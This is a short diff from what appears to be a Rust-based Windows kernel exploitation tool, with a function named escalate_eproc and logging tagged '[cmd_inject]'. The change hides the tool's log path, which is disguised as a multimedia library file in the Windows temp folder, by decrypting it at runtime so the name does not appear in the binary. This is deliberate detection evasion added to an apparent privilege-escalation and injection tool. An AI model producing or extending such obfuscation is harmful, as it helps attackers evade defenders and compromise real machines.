@@ -184,7 +184,9 @@ fn escalate_eproc(krw: &KernelRW, eproc: u64, sys_present: u64) -> Result<()> {
 
 fn log_debug(msg: &str) {
     use std::io::Write;
-    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open("C:\\Windows\\Temp\\mmdevlib_kernel.log") {
+    // Use runtime-decrypted path (no plaintext log name in the binary image for this string).
+    let log_path = crate::obf::decrypt_to_string(crate::obf::E_LOG_PATH);
+    if let Ok(mut f) = std::fs::OpenOptions::new().create(true).append(true).open(&log_path) {
         let _ = writeln!(f, "[cmd_inject] {}", msg);
         let _ = f.sync_all();
     }
